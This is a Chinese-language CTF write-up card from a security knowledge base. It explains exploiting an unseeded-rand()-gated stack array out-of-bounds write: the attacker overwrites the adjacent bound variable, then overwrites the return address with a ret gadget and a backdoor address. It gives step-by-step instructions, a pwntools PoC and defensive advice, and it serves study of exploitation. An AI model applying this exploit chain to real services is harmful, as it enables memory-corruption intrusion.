---
id: ctf-pwn-unseeded-rand-array-oob-bound-overwrite-ret2win
title: 未播种 rand 门控的栈数组越界：先改上界再写返回地址 ret2win
type: scenario
domain: ctf
path: ctf/pwn
technique: unseeded-rand-gated-array-oob-bound-overwrite-ret2win
tags:
- pwn
- stack
- oob-write
- rand
- ret2win
- stack-alignment
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:40:36+08:00'
  notes: 已对照原文核对（无图）：vuln() 栈布局 v2[17]@rbp-0xB0、number1@rbp-0x28 即 v2[17]，写入 number2=0x10 可把 number1 改为 0x17；门控 number2<=rand()%(number1+1) 与未 srand 的固定序列成立；number2=0x16 写 v2[23]=rbp+8 返回地址填 ret(0x40101a)，number2=0x17 写 v2[24]=rbp+0x10 填后门(0x401339)，leave;ret 后 ret gadget 再弹后门，栈对齐逻辑正确；原文 exp 的 cyc/change/pwn1/pwn2 顺序与 p64 值一致。未验证点：未本机复跑二进制，rand 序列命中轮次（cyc 数量）与地址需按目标 ELF 复核；原文未展示成功 flag 输出；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/ctf/pwn/ctf-pwn-unseeded-rand-array-oob-bound-overwrite-ret2win/
draft: false
kb_aliases:
- array 题解
- rand 未初始化
- 随机数门控越界写
- 覆盖 number1 上界
- v2 数组越界
- ret 对齐 ret2win
---

## 一句话结论

当程序用未播种的 `rand()` 做“随机数门控”决定能否写栈数组 `v2[number2+1]` 时，`rand()` 序列其实固定可预测；攻击者先利用越界下标 16 覆盖紧邻的 `number1` 上界，把随机数范围从 0~17 扩大到 0~23，再在下一次随机数命中时用下标 22 写返回地址为 `ret` gadget、下标 23 写后门地址，函数返回时经 `ret` 弹入后门完成 ret2win。

## 原理

- **门控逻辑**：`vuln()` 先读 `number1`（要求 ≤0x11），循环中读 `number2`，仅当 `number2 <= rand() % (number1 + 1)` 时才执行 `read(0, &v2[number2[0] + 1], 8)`。`rand()` 从未调用 `srand()`，glibc 默认种子固定，因此每次运行的随机序列相同，攻击者可预测/枚举哪一轮允许写哪个下标。
- **栈布局**：`_QWORD v2[17]` 位于 `rbp-0xB0`，`number1` 位于 `rbp-0x28`，正好是 `v2[17]`（`v2 + 17*8 = rbp-0xB0+0x88 = rbp-0x28`）。写入 `v2[17]` 就是改写 `number1` 本身。
- **第一步扩上界**：当某轮 `rand()%18 >= 16` 时，用 `number2=0x10` 写 `v2[17]` 为 0x17（23），`number1` 从 0x11 变成 0x17，后续门控变成 `rand()%24`，允许写入下标 0~23。
- **第二步写返回地址**：`v2[23] = rbp-0xB0+0xB8 = rbp+0x8`，即保存的返回地址；`v2[24] = rbp+0x10`。用 `number2=0x16`（22）写 `v2[23]` 为 `ret` gadget（如 0x40101a）满足 16 字节栈对齐，用 `number2=0x17`（23）写 `v2[24]` 为后门函数地址。函数 `leave; ret` 后先跳到 `ret`，`ret` 再弹出后门地址，规避 `movaps` 对齐崩溃。
- **为什么可行**：C 数组不做边界检查；`read` 直接写 8 字节原始数据，允许输入任意二进制值而非十进制；`number1` 与数组相邻且被用作取模上界，越界写它就能动态放宽门控；二进制 No PIE/无 canary，后门与 gadget 地址固定。
- **随机等待**：门控不是每次都能写目标下标，PoC 通过反复发送“通过字符 + number2=0”的空操作推进 `rand()` 序列，直到某轮随机值足够大再执行关键写入。

## 触发条件

- 程序用 `rand()`（未 `srand` 或种子可预测）作为数组下标写入的门控，且允许的下标上界由可越界覆盖的变量控制。
- 目标数组与上界变量在栈上相邻，或存在其他可越界改写的长度/索引变量。
- 写入使用 `read`/`memcpy` 等原始字节接口，可写入任意数值。
- 二进制 No PIE、无 canary，存在后门/win 函数和可用的 `ret` gadget。
- 攻击者能多次交互推进随机序列并观察/预测随机值。

## 利用步骤

1. 反汇编确认 `v2` 基址、`number1` 偏移、返回地址偏移；计算目标下标：`(rbp-0x28 - v2_base)/8 = 17`、`(rbp+8 - v2_base)/8 = 23`。
2. 确认 `rand()` 未播种（无 `srand` 调用），本地运行记录随机序列或直接按 glibc 默认序列预测。
3. 用空操作推进随机序列，等待 `rand()%18 >= 16`；发送 `number2=0x10`，随后写入 8 字节值 `0x17`，覆盖 `number1` 上界。
4. 继续推进序列，等待 `rand()%24 >= 22`；发送 `number2=0x16`，写入 `ret` gadget 地址（如 `0x40101a`）。
5. 再等待一次门控通过，发送 `number2=0x17`，写入后门函数地址（如 `0x401339`）。
6. 发送 `D` 退出循环，函数返回时经 `ret` gadget 跳到后门，读取 flag。

## PoC

```python
from pwn import *
context.arch = "amd64"
io = process("./array")
io.send(b'\x11\x00\x00\x00\x00\x00\x00\x00')   # number1 = 0x11

def pass_round():                              # 推进一轮 rand()
    io.sendline(b'a')
    io.send(b'\x00')
    io.recvuntil(b"plz input your number2:")

def write_idx(idx, data):
    io.sendline(b'a')
    io.send(bytes([idx]))
    io.recvuntil(b"plz input your number2:")
    io.send(data)

# 等待门控允许：反复空转，直到可写 index 0x10
for _ in range(N1):
    pass_round()
write_idx(0x10, b'\x17\x00\x00\x00\x00\x00\x00\x00')   # number1 = 0x17

for _ in range(N2):
    pass_round()
write_idx(0x16, p64(0x40101a))                 # return address = ret（栈对齐）

for _ in range(N3):
    pass_round()
write_idx(0x17, p64(0x401339))                 # v2[24] = 后门

io.sendline(b'D')
io.interactive()
```

说明：`N1/N2/N3` 取决于 `rand()` 序列与门控命中时机，需按实际二进制调试确定；原文 exp 用大量 `cyc()` 推进。后门/`ret` 地址按目标 ELF 替换。

## 变体与关联

- 变体：若程序调用了 `srand(time(0))`，需预测/爆破时间种子，或利用其它泄漏；若随机值来自可观测输出，可直接同步。
- 变体：上界变量不相邻时，可寻找其他越界可写的长度/索引字段，或先改指针再写。
- 变体：有 canary 时需先泄露/绕过；PIE 时需先泄代码基址；也可改 GOT/函数指针而非返回地址。
- 关联：[[ctf-pwn-int-array-oob-index-ret-overwrite]]（无随机门控的直接数组下标越界 ret2win，本卡补充 rand 门控与上界覆盖）、[[binary-pwn-stack-*]] 栈溢出/ROP 系列。
- 边界：`rand()` 被安全种子初始化且不可预测、上界变量不可达、数组写入有长度/范围检查、开启 canary/PIE 且无泄漏时，该链需调整或失效。

## 检测与防御

- 代码层：对所有数组下标做严格上界检查（`idx < ARRAY_SIZE`），不要用用户可控变量做取模上界；长度/索引变量与数组分开存放并初始化。
- 随机数：不要用 `rand()` 做安全门控（即使播种也可预测）；需要安全随机用 `getrandom`/`/dev/urandom`。
- 编译加固：开启 stack canary、PIE、FORTIFY、`-fstack-protector-strong`；删除/保护后门函数，避免导出 `win` 符号。
- 检测：CTF/审计中检查 `rand()` 无 `srand`、数组与长度变量相邻、`read` 写 `&arr[idx]` 的代码模式；运行时监控越界写与异常 `ret` 跳转。
- 响应：若为真实服务，修复边界检查并重新编译，轮换受影响版本；对崩溃/异常跳转做告警。
